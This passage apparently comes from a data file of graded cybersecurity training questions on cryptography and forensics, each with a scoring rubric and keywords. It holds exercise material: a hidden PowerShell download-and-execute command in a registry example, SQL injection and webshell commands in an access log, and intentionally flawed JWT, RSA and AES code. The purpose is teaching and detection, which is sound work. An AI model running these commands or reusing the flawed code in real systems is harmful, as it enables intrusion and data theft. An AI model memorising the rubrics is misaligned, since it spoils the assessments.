    `A web application uses AES-CBC encryption and returns different error messages for padding errors vs. valid decryption:\n\n- Invalid padding: HTTP 500 "Decryption error"\n- Valid padding but invalid data: HTTP 200 with error message\n- Valid data: HTTP 200 with success\n\nExplain step by step how a padding oracle attack works against this system:\n1. How does CBC decryption work at the block level?\n2. How does PKCS#7 padding validation create the oracle?\n3. How do you use the oracle to decrypt one byte at a time?\n4. How many requests are needed to decrypt a single block?`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "cbc-decryption", description: "Correctly describes CBC decryption: decrypt block, XOR with previous ciphertext block", points: 2, keywords: ["decrypt", "XOR", "previous block", "ciphertext", "block cipher"], check: "Student correctly traces CBC decryption at the block level" },
      { id: "pkcs7-oracle", description: "Explains PKCS#7 padding validation: last byte indicates pad length, creates binary oracle", points: 2, keywords: ["PKCS#7", "padding", "last byte", "0x01", "0x02", "valid", "invalid"], check: "Student explains how PKCS#7 validation creates a yes/no oracle" },
      { id: "byte-recovery", description: "Traces how modifying the previous ciphertext block and observing the oracle reveals the intermediate value, then the plaintext", points: 3, keywords: ["modify", "previous block", "intermediate", "0x01", "brute force", "256 attempts"], check: "Student correctly traces the byte-by-byte recovery process" },
      { id: "request-count", description: "Calculates approximately 256 * 16 = 4096 requests per block in the worst case", points: 2, keywords: ["256", "per byte", "16 bytes", "4096", "worst case", "requests"], check: "Student provides a correct request count estimate" },
    ],
    gaps: [
      { if_missing: "cbc-decryption", gap: "Does not understand CBC mode mechanics — review block cipher modes at the block level" },
      { if_missing: "byte-recovery", gap: "Cannot trace the padding oracle attack — study the attack step by step with concrete examples" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "diffie-hellman",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Two parties perform a Diffie-Hellman key exchange with these parameters:\n\n\`\`\`\np = 23 (prime)\ng = 5 (generator)\n\nAlice picks a = 6, computes A = g^a mod p\nBob picks b = 15, computes B = g^b mod p\n\`\`\`\n\nCompute A and B. Then compute the shared secret from both sides and verify they match. Now explain: Why is this secure with large primes but breakable here? What is the discrete logarithm problem? How does a man-in-the-middle attack work against unauthenticated DH?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "computation", description: "Correctly computes A = 5^6 mod 23 = 8, B = 5^15 mod 23 = 19, shared secret = 2", points: 2, keywords: ["8", "19", "shared secret", "2", "modular exponentiation"], check: "Student correctly computes A, B, and the shared secret" },
      { id: "dlog-problem", description: "Explains the discrete logarithm problem: given g, p, and A, finding a is computationally hard for large p", points: 2, keywords: ["discrete logarithm", "hard", "computationally infeasible", "one-way", "large prime"], check: "Student explains the discrete log problem as the security foundation" },
      { id: "small-prime", description: "Notes p=23 is trivially breakable by exhaustive search; security requires 2048+ bit primes", points: 2, keywords: ["small", "trivial", "brute force", "2048", "exhaustive", "too small"], check: "Student explains why small parameters are insecure" },
      { id: "mitm-attack", description: "Describes MITM: attacker intercepts and performs separate DH exchanges with each party", points: 2, keywords: ["man-in-the-middle", "intercept", "two exchanges", "impersonate", "unauthenticated"], check: "Student describes the MITM attack on unauthenticated DH" },
    ],
    gaps: [
      { if_missing: "dlog-problem", gap: "Does not understand the discrete logarithm problem — study the mathematical basis of DH security" },
      { if_missing: "mitm-attack", gap: "Missing knowledge of DH authentication requirements — study authenticated key exchange" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "stream-cipher",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Two messages are encrypted with the same RC4 key and you intercept both ciphertexts:\n\n\`\`\`\nC1 = ciphertext of message M1\nC2 = ciphertext of message M2\n\`\`\`\n\nYou know that M1 starts with the HTTP header "GET / HTTP/1.1". Explain step by step:\n1. What is the fundamental error in reusing a stream cipher key?\n2. How do you compute C1 XOR C2, and what does the result give you?\n3. How do you use the known plaintext of M1 to recover bytes of M2?\n4. What is this attack called, and what are the real-world protocols that were vulnerable to it?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "keystream-reuse", description: "Explains reusing the key means reusing the keystream, so C1 XOR C2 = M1 XOR M2", points: 2, keywords: ["keystream reuse", "nonce reuse", "same stream", "XOR cancels"], check: "Student explains that key/nonce reuse leaks the XOR of plaintexts" },
      { id: "known-plaintext", description: "Shows how knowing M1 bytes allows recovering M2: M2 = C1 XOR C2 XOR M1", points: 2, keywords: ["known plaintext", "XOR", "recover", "M2 = C1 XOR C2 XOR M1"], check: "Student traces the known-plaintext recovery step by step" },
      { id: "crib-dragging", description: "Names the technique as crib dragging and explains sliding the known text across the XOR output", points: 2, keywords: ["crib dragging", "sliding", "two-time pad", "many-time pad"], check: "Student identifies crib dragging as the attack technique" },
      { id: "real-world", description: "Names real protocols vulnerable to this: WEP, early TLS RC4, PPTP MS-CHAPv2", points: 2, keywords: ["WEP", "WPA", "TLS", "PPTP", "MS-CHAP", "802.11", "nonce"], check: "Student identifies real-world protocols that suffered from key reuse" },
    ],
    gaps: [
      { if_missing: "keystream-reuse", gap: "Does not understand stream cipher nonce reuse — study the two-time pad problem" },
      { if_missing: "crib-dragging", gap: "Missing crib dragging technique — practice known-plaintext attacks on XOR ciphers" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "jwt-attacks",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A web application verifies JWTs with this code:\n\n\`\`\`python\nimport jwt\n\ndef verify_token(token, public_key):\n    try:\n        payload = jwt.decode(token, public_key, algorithms=["RS256", "HS256"])\n        return payload\n    except jwt.InvalidTokenError:\n        return None\n\ndef create_admin_token(secret_key):\n    payload = {"user": "admin", "role": "admin", "exp": 9999999999}\n    return jwt.encode(payload, secret_key, algorithm="HS256")\n\`\`\`\n\nIdentify the critical vulnerability in the verification function. Explain the algorithm confusion attack step by step: how would an attacker forge a valid admin token using only the public key? Fix the code to prevent this attack.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "alg-confusion", description: "Identifies the algorithm confusion vulnerability: accepting both RS256 and HS256", points: 2, keywords: ["algorithm confusion", "alg switch", "RS256", "HS256", "both algorithms"], check: "Student identifies the algorithm confusion attack vector" },
      { id: "attack-steps", description: "Explains attacker changes alg header to HS256, signs with the public key as HMAC secret", points: 3, keywords: ["change alg", "HS256", "public key", "HMAC secret", "sign", "forge"], check: "Student traces the complete attack: modify header, sign with public key as HMAC secret" },
      { id: "fix", description: "Fixes code to only allow the expected algorithm (whitelist RS256 only)", points: 2, keywords: ["whitelist", "only RS256", "single algorithm", "strict", "algorithms=[\"RS256\"]"], check: "Student restricts the algorithm to only the intended one" },
      { id: "exp-hardcoded", description: "Notes the hardcoded far-future expiration in create_admin_token", points: 1, keywords: ["expiration", "9999999999", "far future", "no expiry", "hardcoded"], check: "Student identifies the excessive token lifetime" },
    ],
    gaps: [
      { if_missing: "alg-confusion", gap: "Unaware of JWT algorithm confusion attacks — study JWT header manipulation vulnerabilities" },
      { if_missing: "fix", gap: "Cannot implement JWT security fixes — review JWT verification best practices" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "rsa-implementation",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A developer implements RSA encryption for a messaging app:\n\n\`\`\`python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5\nimport random\n\ndef generate_keypair():\n    key = RSA.generate(1024)\n    return key, key.publickey()\n\ndef encrypt_message(message, public_key):\n    cipher = PKCS1_v1_5.new(public_key)\n    return cipher.encrypt(message.encode())\n\ndef decrypt_message(ciphertext, private_key):\n    cipher = PKCS1_v1_5.new(private_key)\n    return cipher.decrypt(ciphertext, sentinel=b'DECRYPTION_FAILED').decode()\n\`\`\`\n\nIdentify all the cryptographic weaknesses. Fix each one and explain why the original is insecure. What attack does PKCS#1 v1.5 enable that OAEP prevents?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "key-size", description: "Flags 1024-bit RSA as too small — 2048 or 4096 needed", points: 2, keywords: ["1024", "too small", "2048", "4096", "factoring", "insufficient"], check: "Student identifies the RSA key as too short" },
      { id: "pkcs1-bleichenbacher", description: "Identifies PKCS#1 v1.5 as vulnerable to Bleichenbacher's adaptive chosen-ciphertext attack", points: 2, keywords: ["Bleichenbacher", "PKCS#1 v1.5", "adaptive", "chosen ciphertext", "million message"], check: "Student identifies the Bleichenbacher attack on PKCS#1 v1.5" },
      { id: "oaep-fix", description: "Recommends OAEP padding as the fix, which is CCA-secure", points: 2, keywords: ["OAEP", "PKCS1_OAEP", "CCA-secure", "optimal asymmetric"], check: "Student recommends OAEP as the secure padding scheme" },
      { id: "sentinel-leak", description: "Notes the sentinel value is static and may enable side-channel timing attacks", points: 2, keywords: ["sentinel", "timing", "side channel", "static", "constant-time"], check: "Student identifies the sentinel value as a potential side-channel leak" },
    ],
    gaps: [
      { if_missing: "pkcs1-bleichenbacher", gap: "Unaware of Bleichenbacher attack — study adaptive chosen-ciphertext attacks on RSA" },
      { if_missing: "oaep-fix", gap: "Missing knowledge of OAEP — review modern RSA encryption padding schemes" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "key-derivation",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `An application derives encryption keys from user passwords:\n\n\`\`\`python\nimport hashlib\nfrom Crypto.Cipher import AES\n\ndef encrypt_file(filepath, password):\n    key = hashlib.sha256(password.encode()).digest()\n    iv = b'\\x00' * 16\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    \n    with open(filepath, 'rb') as f:\n        data = f.read()\n    \n    # Pad to 16 bytes\n    pad_len = 16 - len(data) % 16\n    data += bytes([pad_len]) * pad_len\n    \n    return cipher.encrypt(data)\n\`\`\`\n\nList every cryptographic flaw. Fix the code to be cryptographically sound, explaining what each change prevents.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "no-kdf", description: "Identifies that a single SHA-256 hash is not a proper KDF — vulnerable to brute force", points: 2, keywords: ["KDF", "key derivation", "PBKDF2", "Argon2", "scrypt", "iterations", "brute force"], check: "Student identifies the need for a proper key derivation function" },
      { id: "static-iv", description: "Flags the all-zero IV as a critical flaw — same password always produces same keystream", points: 2, keywords: ["static IV", "zero IV", "random IV", "deterministic", "same ciphertext"], check: "Student identifies the static IV as a critical vulnerability" },
      { id: "no-auth", description: "Notes no authentication (MAC/AEAD) — ciphertext can be tampered with undetected", points: 2, keywords: ["no MAC", "authentication", "integrity", "AEAD", "GCM", "tamper", "malleable"], check: "Student identifies missing ciphertext authentication" },
      { id: "no-salt", description: "Notes no salt in key derivation — same password always produces same key across users", points: 2, keywords: ["no salt", "salt", "unique", "per-user", "deterministic key"], check: "Student identifies the missing salt in key derivation" },
    ],
    gaps: [
      { if_missing: "no-kdf", gap: "Does not understand key derivation — study PBKDF2, Argon2, and why fast hashes are unsuitable" },
      { if_missing: "no-auth", gap: "Missing authenticated encryption knowledge — study AEAD modes (GCM, ChaCha20-Poly1305)" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "tls-weaknesses",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You are auditing a server's TLS configuration and find it supports:\n\n\`\`\`\nTLS 1.0, TLS 1.1, TLS 1.2, TLS 1.3\nCipher suites include: RC4-SHA, DES-CBC3-SHA, AES128-CBC-SHA, AES256-GCM-SHA384\nRSA key exchange (no forward secrecy)\nOCSP stapling: disabled\nHSTS: not configured\n\`\`\`\n\nDesign a hardened TLS configuration. For each change you make, explain the specific attack it prevents. Explain what forward secrecy is and why RSA key exchange lacks it. What is the practical impact of supporting TLS 1.0?`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "tls-versions", description: "Recommends disabling TLS 1.0/1.1 (BEAST, POODLE, CRIME) and keeping only 1.2/1.3", points: 2, keywords: ["TLS 1.0", "TLS 1.1", "disable", "BEAST", "POODLE", "deprecated"], check: "Student recommends disabling old TLS versions with specific attack justifications" },
      { id: "cipher-hardening", description: "Removes RC4, DES, and CBC mode suites; keeps only AEAD (GCM, ChaCha20-Poly1305)", points: 2, keywords: ["RC4", "DES", "remove", "AEAD", "GCM", "ChaCha20", "disable CBC"], check: "Student removes weak ciphers and justifies each removal" },
      { id: "forward-secrecy", description: "Explains forward secrecy (ECDHE/DHE) and why RSA key exchange allows retrospective decryption", points: 3, keywords: ["forward secrecy", "ECDHE", "DHE", "ephemeral", "retrospective", "compromise"], check: "Student correctly explains forward secrecy and the RSA key exchange problem" },
      { id: "hsts-ocsp", description: "Recommends enabling HSTS and OCSP stapling, explains what each prevents", points: 2, keywords: ["HSTS", "OCSP stapling", "downgrade", "certificate revocation", "stripping"], check: "Student adds HSTS and OCSP stapling with justification" },
    ],
    gaps: [
      { if_missing: "forward-secrecy", gap: "Does not understand forward secrecy — study ephemeral key exchange and its importance" },
      { if_missing: "cipher-hardening", gap: "Cannot evaluate cipher suite security — review modern cipher suite best practices" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "crypto-protocol-design",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `Design a secure file encryption scheme for a backup application where:\n- Files are encrypted at rest with a user-chosen password\n- The same file encrypted twice should produce different ciphertexts\n- A corrupted byte in the ciphertext must be detected before any decryption output\n- The scheme must resist offline brute-force attacks against the password\n- An attacker with access to the encrypted file and the software source code should not be able to decrypt without the password\n\nSpecify: the KDF and its parameters, the encryption mode, how you handle the IV/nonce, the authentication scheme, and the exact byte layout of the output file. Justify each choice.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "kdf-choice", description: "Chooses Argon2id or scrypt with appropriate parameters (memory, iterations, parallelism)", points: 2, keywords: ["Argon2id", "scrypt", "PBKDF2", "memory-hard", "iterations", "cost"], check: "Student selects an appropriate memory-hard KDF with specific parameters" },
      { id: "aead-mode", description: "Selects an AEAD mode (AES-256-GCM or XChaCha20-Poly1305) for encrypt-then-MAC in one step", points: 2, keywords: ["AEAD", "GCM", "ChaCha20-Poly1305", "authenticated encryption", "encrypt then MAC"], check: "Student selects an AEAD cipher mode" },
      { id: "random-iv-salt", description: "Uses random salt for KDF and random nonce/IV for each encryption, stored with ciphertext", points: 2, keywords: ["random salt", "random nonce", "random IV", "unique", "prepend", "stored"], check: "Student uses random salt and nonce, ensuring different ciphertexts" },
      { id: "file-format", description: "Specifies a complete file format: version byte, salt, nonce, ciphertext, auth tag", points: 2, keywords: ["format", "version", "salt", "nonce", "tag", "header", "layout"], check: "Student defines a concrete serialization format" },
      { id: "threat-model", description: "Addresses the Kerckhoffs principle — security rests on the password, not the algorithm", points: 2, keywords: ["Kerckhoffs", "open design", "key only", "algorithm public", "no obscurity"], check: "Student addresses security given known algorithm (open-source assumption)" },
    ],
    gaps: [
      { if_missing: "kdf-choice", gap: "Weak KDF knowledge — study memory-hard KDFs and their parameter tuning" },
      { if_missing: "aead-mode", gap: "Does not know AEAD — study authenticated encryption modes and why encrypt-then-MAC matters" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "symmetric-vs-asymmetric",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare symmetric and asymmetric cryptography across these dimensions:\n\n1. Performance: Why is AES-256-GCM ~1000x faster than RSA-2048?\n2. Key distribution: How does each solve the key exchange problem?\n3. Security level: Why does RSA-2048 provide only ~112-bit security while AES-256 provides 256-bit?\n4. Use in TLS: Explain exactly how TLS 1.3 combines both in a handshake\n\nFor each dimension, explain the fundamental mathematical reason for the difference, not just the practical consequence.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "performance-reason", description: "Explains symmetric uses simple operations (substitution, permutation, XOR) vs. asymmetric uses modular exponentiation", points: 2, keywords: ["substitution", "permutation", "XOR", "modular exponentiation", "hardware", "AES-NI", "big number"], check: "Student explains the mathematical reason for the performance difference" },
      { id: "key-distribution", description: "Explains symmetric requires pre-shared key, asymmetric solves this but needs PKI/trust", points: 2, keywords: ["pre-shared", "key exchange", "public key", "PKI", "trust", "certificate"], check: "Student contrasts key distribution approaches" },
      { id: "security-levels", description: "Explains RSA-2048 ~112-bit security due to sub-exponential factoring algorithms (NFS), while AES is brute-force only", points: 3, keywords: ["number field sieve", "sub-exponential", "factoring", "brute force", "exponential", "112-bit"], check: "Student explains why asymmetric keys need to be larger than symmetric keys" },
      { id: "tls-hybrid", description: "Traces TLS 1.3 handshake: ECDHE for key exchange, certificates for authentication, symmetric for bulk data", points: 2, keywords: ["ECDHE", "key exchange", "certificate", "authenticate", "symmetric", "bulk", "hybrid"], check: "Student traces the TLS 1.3 hybrid approach" },
    ],
    gaps: [
      { if_missing: "security-levels", gap: "Does not understand equivalent security levels — study NIST key size recommendations and their basis" },
      { if_missing: "tls-hybrid", gap: "Missing understanding of how TLS combines both — study TLS 1.3 handshake in detail" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "hash-mac-signature",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Explain the differences between these three cryptographic primitives and when to use each:\n\n1. Hash function (SHA-256)\n2. MAC (HMAC-SHA-256)\n3. Digital signature (ECDSA with SHA-256)\n\nFor each pair, give a concrete scenario where using the wrong one creates a vulnerability. Specifically: Why can't a hash function replace a MAC? Why can't a MAC replace a digital signature? What property does each provide that the others lack?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "hash-properties", description: "Explains hashes provide integrity but not authentication — anyone can compute the hash", points: 2, keywords: ["integrity", "no authentication", "anyone", "compute", "no key", "public"], check: "Student explains hashes lack authentication" },
      { id: "mac-vs-hash", description: "Explains MAC adds a shared secret so only key holders can produce/verify — prevents forgery", points: 2, keywords: ["shared secret", "key", "forgery", "authentication", "HMAC", "keyed"], check: "Student explains how MACs add authentication over plain hashes" },
      { id: "signature-nonrepudiation", description: "Explains signatures provide non-repudiation — only the private key holder could have signed", points: 2, keywords: ["non-repudiation", "private key", "verify with public", "proof", "third party"], check: "Student identifies non-repudiation as unique to signatures" },
      { id: "wrong-primitive", description: "Gives concrete vulnerability examples for using the wrong primitive", points: 2, keywords: ["vulnerability", "wrong", "scenario", "example", "replace", "attack"], check: "Student provides scenarios where using the wrong primitive creates vulnerabilities" },
    ],
    gaps: [
      { if_missing: "signature-nonrepudiation", gap: "Does not understand non-repudiation — study the difference between authentication and non-repudiation" },
      { if_missing: "mac-vs-hash", gap: "Confused about hash vs. MAC — review keyed vs. unkeyed integrity primitives" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "certificate-pinning",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `A mobile banking application uses TLS certificate pinning to prevent man-in-the-middle attacks. As a penetration tester, you need to intercept the traffic for security testing.\n\nAddress these questions:\n1. How does certificate pinning work at the TLS level? What exactly is being pinned (certificate, public key, or hash)?\n2. Describe three different methods to bypass certificate pinning on Android and iOS\n3. How would you implement certificate pinning securely if you were advising the development team? Address pin rotation, backup pins, and failure modes\n4. What is the relationship between certificate pinning and Certificate Transparency? Can they complement each other?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "pinning-mechanism", description: "Explains pinning stores expected cert/key/hash and compares during TLS handshake, rejecting mismatches", points: 2, keywords: ["pin", "hash", "public key", "compare", "TLS handshake", "reject", "expected"], check: "Student correctly explains the certificate pinning mechanism" },
      { id: "bypass-methods", description: "Describes bypass methods: Frida hooking, Objection, SSL Kill Switch, Magisk module, root + Xposed", points: 3, keywords: ["Frida", "Objection", "SSL Kill Switch", "hook", "Magisk", "root", "bypass"], check: "Student provides at least three concrete bypass methods" },
      { id: "secure-implementation", description: "Advises pinning the public key hash (not cert), including backup pins, and graceful failure", points: 3, keywords: ["public key hash", "SPKI", "backup pin", "rotation", "graceful failure", "reporting"], check: "Student provides comprehensive secure implementation guidance" },
      { id: "ct-relationship", description: "Explains CT and pinning are complementary: CT detects rogue certs, pinning enforces expected certs", points: 2, keywords: ["complementary", "CT detects", "pinning enforces", "rogue", "misissued", "both"], check: "Student explains how CT and pinning work together" },
    ],
    gaps: [
      { if_missing: "bypass-methods", gap: "Cannot bypass certificate pinning — study Frida-based and framework-level pinning bypass techniques" },
      { if_missing: "secure-implementation", gap: "Missing secure pinning implementation knowledge — study OWASP Mobile Security guidelines for pinning" },
    ],
  },
},

// --- forensics (Forensics & steganography) ---

{
  competencyId: "forensics",
  subTopic: "file-headers",
  questionType: "predict_output",
  difficulty: 1,
  questionText:
    `You examine a file with \`xxd\` and see the following first 16 bytes:\n\n\`\`\`\n00000000: 5046 4446 2d31 2e34 0a25 c4e5 f2e5  %PDF-1.4.%....\n\`\`\`\n\nBut the file is named \`image.jpg\`. Another file shows:\n\`\`\`\n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR\n\`\`\`\n\nBut is named \`document.docx\`.\n\nFor each file: What is the actual file type based on the magic bytes? What is the significance of file magic bytes vs. file extensions? What tool would you use to identify the true type, and why is relying on extensions dangerous in forensics?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "magic-identification", description: "Correctly identifies first file as PDF (25 50 44 46) and second as PNG (89 50 4E 47)", points: 2, keywords: ["PDF", "PNG", "magic bytes", "header", "signature", "file type"], check: "Student correctly identifies both file types from their magic bytes" },
      { id: "extension-danger", description: "Explains extensions are user-controlled metadata, not reliable indicators of content", points: 2, keywords: ["extension", "unreliable", "user-controlled", "metadata", "renamed", "spoofed"], check: "Student explains why file extensions are not trustworthy" },
      { id: "tools", description: "Names file command, binwalk, or similar tools that use magic byte databases", points: 2, keywords: ["file command", "binwalk", "libmagic", "magic database", "file type identification"], check: "Student names appropriate file identification tools" },
    ],
    gaps: [
      { if_missing: "magic-identification", gap: "Cannot identify file types from magic bytes — memorize common file signatures" },
      { if_missing: "extension-danger", gap: "Over-relies on file extensions — study file format identification by content" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "memory-forensics",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `You acquire a memory dump from a Windows system and run these Volatility 3 commands:\n\n\`\`\`bash\nvol3 -f memory.dmp windows.pslist\nvol3 -f memory.dmp windows.netscan\nvol3 -f memory.dmp windows.cmdline\n\`\`\`\n\nThe pslist shows a process \`svchost.exe\` with PID 4820 whose parent PID is 6100 (\`cmd.exe\`). The netscan shows PID 4820 has an established connection to 185.220.100.252:443.\n\nWhat is suspicious about this process? What additional Volatility plugins would you run to investigate, and what would each reveal?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "parent-anomaly", description: "Identifies svchost.exe should be spawned by services.exe, not cmd.exe — indicates masquerading", points: 2, keywords: ["parent", "services.exe", "cmd.exe", "suspicious", "masquerading", "anomalous"], check: "Student flags the abnormal parent process relationship" },
      { id: "external-conn", description: "Notes svchost.exe connecting externally on 443 is suspicious — possible C2 channel", points: 2, keywords: ["external", "C2", "command and control", "443", "suspicious connection", "beacon"], check: "Student flags the external connection as potential C2" },
      { id: "plugins", description: "Suggests malfind (injected code), dlllist (loaded DLLs), handles (open handles), procdump (extract binary)", points: 2, keywords: ["malfind", "dlllist", "handles", "procdump", "vadinfo", "inject"], check: "Student suggests appropriate follow-up Volatility plugins" },
      { id: "investigation-logic", description: "Shows logical progression: verify binary path, check for injection, extract and hash the executable", points: 2, keywords: ["verify path", "hash", "VirusTotal", "binary", "extract", "analyze"], check: "Student describes a logical investigation workflow" },
    ],
    gaps: [
      { if_missing: "parent-anomaly", gap: "Does not know normal Windows process relationships — study the Windows process tree" },
      { if_missing: "plugins", gap: "Unfamiliar with Volatility plugins — practice memory forensics with Volatility" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "registry-analysis",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `During an incident response, you examine the following Windows registry entries:\n\n\`\`\`\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  "WindowsUpdate" = "C:\\Users\\Public\\svchost.exe -enc aGVsbG8gd29ybGQ="\n\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n  "Cleanup" = "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.50/s')"\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\LegitService\n  "ImagePath" = "C:\\Windows\\Temp\\payload.exe"\n  "Start" = 2\n\`\`\`\n\nIdentify every indicator of compromise in these registry entries. For each, explain what persistence mechanism it implements and what the suspicious elements are.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "run-key-masquerade", description: "Identifies the Run key binary masquerading as svchost.exe in wrong path, with encoded argument", points: 2, keywords: ["masquerade", "svchost", "Public", "wrong path", "encoded", "base64", "-enc"], check: "Student identifies the masquerading binary and encoded command" },
      { id: "powershell-cradle", description: "Identifies the RunOnce entry as a PowerShell download cradle with bypass and hidden flags", points: 2, keywords: ["download cradle", "IEX", "DownloadString", "bypass", "hidden", "PowerShell"], check: "Student recognizes the PowerShell download cradle pattern" },
      { id: "service-persistence", description: "Identifies the service in Temp directory with auto-start as malicious persistence", points: 2, keywords: ["service", "Temp", "auto-start", "Start = 2", "ImagePath", "malicious"], check: "Student flags the service binary in a temporary directory" },
      { id: "ioc-extraction", description: "Extracts IOCs: IP address, file paths, base64 string for further investigation", points: 2, keywords: ["IOC", "IP", "10.0.0.50", "path", "base64", "hash", "indicator"], check: "Student extracts concrete indicators of compromise for further analysis" },
    ],
    gaps: [
      { if_missing: "run-key-masquerade", gap: "Cannot identify process masquerading — study normal vs. suspicious Windows executable paths" },
      { if_missing: "powershell-cradle", gap: "Does not recognize PowerShell attack patterns — study common PowerShell-based persistence" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "steganography-detection",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `You suspect a PNG image contains hidden data. You run these analyses:\n\n\`\`\`bash\n$ file suspicious.png\nsuspicious.png: PNG image data, 800 x 600, 8-bit/color RGBA\n\n$ ls -la suspicious.png original.png\n-rw-r--r-- 1 user user 2457600 suspicious.png\n-rw-r--r-- 1 user user  458752 original.png\n\n$ binwalk suspicious.png\nDECIMAL       HEXADECIMAL     DESCRIPTION\n0             0x0             PNG image, 800 x 600\n458800        0x70030         Zip archive data, encrypted\n\`\`\`\n\nWhat do these results tell you? Describe at least three different steganographic techniques and how you would detect each. What tools would you use for each detection method?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "appended-data", description: "Identifies the file is much larger than expected and contains appended ZIP data after the PNG IEND", points: 2, keywords: ["appended", "larger", "ZIP", "after IEND", "concatenated", "embedded"], check: "Student identifies the appended archive data" },
      { id: "lsb-stego", description: "Describes LSB (least significant bit) steganography and its detection via statistical analysis", points: 2, keywords: ["LSB", "least significant bit", "statistical", "chi-square", "histogram", "stegsolve"], check: "Student describes LSB steganography and detection methods" },
      { id: "metadata-stego", description: "Mentions EXIF/metadata-based hiding and EOF appending as techniques", points: 2, keywords: ["EXIF", "metadata", "EOF", "comment field", "chunk", "tEXt"], check: "Student covers metadata and structural steganography" },
      { id: "tools", description: "Names appropriate tools: stegsolve, zsteg, steghide, stegseek, binwalk, foremost", points: 2, keywords: ["stegsolve", "zsteg", "steghide", "stegseek", "binwalk", "foremost"], check: "Student names specific stego detection tools" },
    ],
    gaps: [
      { if_missing: "appended-data", gap: "Misses appended data analysis — study file structure and how data can be hidden after valid file boundaries" },
      { if_missing: "lsb-stego", gap: "Unfamiliar with LSB steganography — study least significant bit embedding and statistical detection" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "log-analysis",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Analyze this sequence of Apache access log entries:\n\n\`\`\`\n10.0.0.5 - - [15/Mar/2024:14:23:01] "GET /login.php HTTP/1.1" 200 3420\n10.0.0.5 - - [15/Mar/2024:14:23:02] "POST /login.php HTTP/1.1" 302 0\n10.0.0.5 - - [15/Mar/2024:14:23:03] "GET /admin/dashboard.php HTTP/1.1" 200 8432\n10.0.0.5 - - [15/Mar/2024:14:23:05] "GET /admin/users.php?id=1 UNION SELECT 1,2,3,username,password FROM users-- HTTP/1.1" 200 12540\n10.0.0.5 - - [15/Mar/2024:14:23:06] "GET /admin/upload.php HTTP/1.1" 200 2100\n10.0.0.5 - - [15/Mar/2024:14:23:08] "POST /admin/upload.php HTTP/1.1" 200 450\n10.0.0.5 - - [15/Mar/2024:14:23:10] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15\n10.0.0.5 - - [15/Mar/2024:14:23:12] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1842\n\`\`\`\n\nReconstruct the complete attack timeline. Identify each attack phase, the technique used, and the evidence of success or failure at each step.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "timeline", description: "Reconstructs the attack phases: login, SQL injection, file upload, webshell execution", points: 2, keywords: ["login", "SQL injection", "upload", "webshell", "phases", "timeline"], check: "Student correctly sequences all attack phases" },
      { id: "sqli-detail", description: "Identifies the UNION-based SQL injection in the URL and explains the column enumeration", points: 2, keywords: ["UNION", "SQL injection", "SELECT", "username", "password", "column"], check: "Student identifies and explains the SQL injection technique" },
      { id: "webshell", description: "Identifies shell.php as a webshell with command execution (cmd parameter)", points: 2, keywords: ["webshell", "shell.php", "cmd", "command execution", "RCE", "upload"], check: "Student identifies the webshell upload and command execution" },
      { id: "success-indicators", description: "Uses HTTP status codes and response sizes to determine success at each step", points: 2, keywords: ["200", "302", "response size", "status code", "success", "redirect"], check: "Student interprets HTTP response codes as success/failure indicators" },
    ],
    gaps: [
      { if_missing: "sqli-detail", gap: "Cannot identify SQL injection in logs — study UNION-based SQLi patterns in access logs" },
      { if_missing: "webshell", gap: "Does not recognize webshell patterns — study common webshell indicators in logs" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "disk-imaging",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
